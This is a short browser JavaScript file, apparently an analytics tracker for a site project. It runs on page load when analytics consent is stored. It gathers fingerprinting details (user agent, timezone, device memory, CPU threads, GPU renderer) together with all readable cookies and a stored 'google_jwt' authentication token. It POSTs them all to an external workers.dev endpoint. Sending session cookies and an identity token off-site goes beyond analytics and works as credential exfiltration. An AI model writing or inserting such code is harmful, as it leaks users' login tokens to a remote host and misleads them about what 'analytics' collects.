function getCookies() {
	const raw = document.cookie || "";
	if (!raw) return [];
	return raw.split(";").map(c => c.trim());
}

function getDeviceMemory() {
	return navigator.deviceMemory || "unknown";
}

function getHardwareThreads() {
	return navigator.hardwareConcurrency || "unknown";
}

async function getGPUInfo() {
	try {
		const canvas = document.createElement("canvas");
		const gl = canvas.getContext("webgl");
		if (!gl) return "unknown";

		const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
		return debugInfo
			? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
			: "unknown";

	} catch {
		return "unknown";
	}
}

async function sendTracker() {
	const prefsRaw = localStorage.getItem("cookies-prefs");
	if (!prefsRaw) return;

	const prefs = JSON.parse(prefsRaw);
	if (!prefs.analytics) return;

	const trackerData = {
		userAgent: navigator.userAgent,
		language: navigator.language,
		platform: navigator.platform,
		timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
		cookiesList: getCookies(),
		cookiesPrefs: prefs,
		deviceMemory: getDeviceMemory(),
		hardwareConcurrency: getHardwareThreads(),
		gpu: await getGPUInfo(),
		google_jwt: localStorage.getItem("google_jwt") || null,
		timestamp: new Date().toISOString()
	};

	fetch("https://tfg-tracker.alexgaro2015.workers.dev", {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify(trackerData)
	});
}

document.addEventListener("DOMContentLoaded", () => {
	const prefs = JSON.parse(localStorage.getItem("cookies-prefs") || "{}");
	if (prefs.analytics) sendTracker();
});